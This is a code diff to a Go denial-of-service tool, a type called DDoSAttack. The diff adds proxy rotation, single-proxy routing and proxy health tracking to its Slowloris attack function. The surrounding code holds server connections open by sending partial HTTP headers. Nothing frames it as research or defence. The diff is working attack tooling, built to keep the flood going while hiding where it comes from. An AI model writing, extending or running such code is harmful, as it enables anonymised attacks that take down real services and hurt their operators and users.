@@ -48,28 +48,61 @@ func (d *DDoSAttack) slowlorisConnection() {
 	var conn net.Conn
 	var err error
 	var tlsConn *tls.Conn
+	var usedProxy string
 
 	dialer := &net.Dialer{
 		Timeout: d.config.Timeout,
 	}
 
-	if useTLS {
-		tlsConfig := d.createTLSConfig()
-		tlsConn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
-		if err != nil {
-			atomic.AddInt64(&d.requestsFailed, 1)
-			return
+	// Proxy support for Slowloris attack
+	if d.config.UseProxy {
+		// Rotate proxies if enabled
+		if d.config.RotateProxy {
+			if proxyURL, ok := d.getNextProxy(); ok {
+				usedProxy = proxyURL
+				conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
+			}
+		} else if len(d.proxies) > 0 {
+			// Single-proxy mode: always use the first proxy
+			proxyURL := d.proxies[0]
+			usedProxy = proxyURL
+			conn, err = d.dialThroughHTTPProxy(dialer, proxyURL, host, port, useTLS)
 		}
-		conn = tlsConn
-	} else {
-		conn, err = dialer.Dial("tcp", host+":"+port)
+	}
+
+	// Fallback to direct connection if no proxy was used
+	if conn == nil && err == nil {
+		if useTLS {
+			tlsConfig := d.createTLSConfig()
+			tlsConn, err = tls.DialWithDialer(dialer, "tcp", host+":"+port, tlsConfig)
+			if err == nil {
+				conn = tlsConn
+			}
+		} else {
+			conn, err = dialer.Dial("tcp", host+":"+port)
+		}
 	}
 
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
+		if usedProxy != "" {
+			d.markProxyFailure(usedProxy)
+		}
 		return
 	}
+
+	// If connection is TLS via proxy, keep a reference for renegotiation
+	if tlsConn == nil {
+		if tc, ok := conn.(*tls.Conn); ok {
+			tlsConn = tc
+		}
+	}
 	defer conn.Close()
+
+	// Successful connection via proxy – mark it healthy
+	if usedProxy != "" {
+		d.markProxySuccess(usedProxy)
+	}
 
 	atomic.AddInt64(&d.requestsSent, 1)
 
@@ -105,6 +138,9 @@ func (d *DDoSAttack) slowlorisConnection() {
 			_, err := conn.Write([]byte(partialHeader))
 			if err != nil {
 				// Connection closed, try again
+				if usedProxy != "" {
+					d.markProxyFailure(usedProxy)
+				}
 				return
 			}
 			atomic.AddInt64(&d.bytesSent, int64(len(partialHeader)))
